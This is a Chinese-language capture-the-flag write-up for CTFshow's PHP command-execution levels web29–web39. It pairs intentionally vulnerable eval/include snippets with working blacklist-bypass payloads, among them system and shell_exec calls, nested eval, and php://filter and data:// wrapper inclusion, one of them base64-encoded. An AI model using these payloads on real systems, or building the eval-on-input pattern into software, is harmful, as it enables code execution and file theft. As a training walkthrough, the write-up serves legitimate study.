---
{"dg-publish":true,"dg-path":"安全/靶场/CTFshow_命令执行.md","permalink":"/安全/靶场/CTFshow_命令执行/","title":"CTFshow_命令执行"}
---

# web29

```php
<?php  
   
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```

```
?c=system(ls);
```
![Pasted image 20240912111923.png](/img/user/picture/Pasted%20image%2020240912111923.png)
```
?c=system("tac fl*");
```

![Pasted image 20240912112201.png](/img/user/picture/Pasted%20image%2020240912112201.png)


# web30

```php
<?php  
  
  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag|system|php/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```
这里禁用了system，可以考虑使用其他命令执行函数
system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等
```
?c=echo shell_exec("tac fl*");
```
![Pasted image 20240912113751.png](/img/user/picture/Pasted%20image%2020240912113751.png)


# web31

```php
<?php   
  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```

注意，这题也过滤了点，空格，单引号

可以尝试通过嵌套eval函数来获取另一个参数的的方法来绕过，因为这里只判断了c这个参数，并不会判断其他参数的传入
```
?c=eval($_GET[a]);&a=system('tac flag.php');
```

# web32

```php
<?php  
  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```
这题过滤了分号、括号等


这题看WP给我提供了一个新的思路，可以利用文件包含
首先看大佬的的payload：
```
c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```

- 首先是include+参数1，作用是包含参数1的文件，运用了文件包含漏洞，最后的文件名字可以改为/etc/passwd和nginx的日志文件来定位flag位置
- 然后是%0a作用，这是url回车符，因为空格被过滤。事实上，删去也无所谓，似乎php会自动给字符串和变量间添加空格（经检验，只在eval中有效，echo中无效，还是得要空格）
- 后面的?>的作用是作为绕过分号，作为语句的结束。原理是：php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?>前可以不写分号。
- 在c中引用了参数1，然后&后对参数1定义，运用文件包含漏洞

![Pasted image 20240912143329.png](/img/user/picture/Pasted%20image%2020240912143329.png)

# web33
```php
<?php  
  
  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```

这题好像和上一题一样？
但是尝试稍微改一下payload，既然可以利用文件包含漏洞
![Pasted image 20240912144540.png](/img/user/picture/Pasted%20image%2020240912144540.png)

```
?c=include%0a$_GET[1]?>&1=data://text/plain,<?php system("cat flag.php");?>
```
ctrl+u查看源代码：
![Pasted image 20240912144626.png](/img/user/picture/Pasted%20image%2020240912144626.png)
# web34

```php
<?php  
   
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```

上一题payload可解


# web35

```php
<?php  
 
  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```


上一题payload可解


# web36
```php
<?php  
  

  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```
过滤了数字，那我们换一个就行了
```
?c=include%0a$_GET[a]?>&a=data://text/plain,<?php system("cat flag.php");?>
```

# web37

```php
<?php  
 
  
//flag in flag.php  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag/i", $c)){  
        include($c);  
        echo $flag;  
      
    }  
          
}else{    highlight_file(__FILE__);  
}
```

感觉这就是正常的文件包含了
```
c=data://text/plain,<?php system("cat fl*");?>
```

![Pasted image 20240912152557.png](/img/user/picture/Pasted%20image%2020240912152557.png)


# web38
```php
<?php   
  
//flag in flag.php  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag|php|file/i", $c)){  
        include($c);  
        echo $flag;  
      
    }  
          
}else{    highlight_file(__FILE__);  
}
```

用base64编码一下：
```
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmwqIik7Pz4=
```


# web39
```
<?php  
   
  
//flag in flag.php  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag/i", $c)){  
        include($c.".php");  
    }  
          
}else{    highlight_file(__FILE__);  
}
```


```
?c=data://text/plain,<?php system("tac fla*.php")?
```






















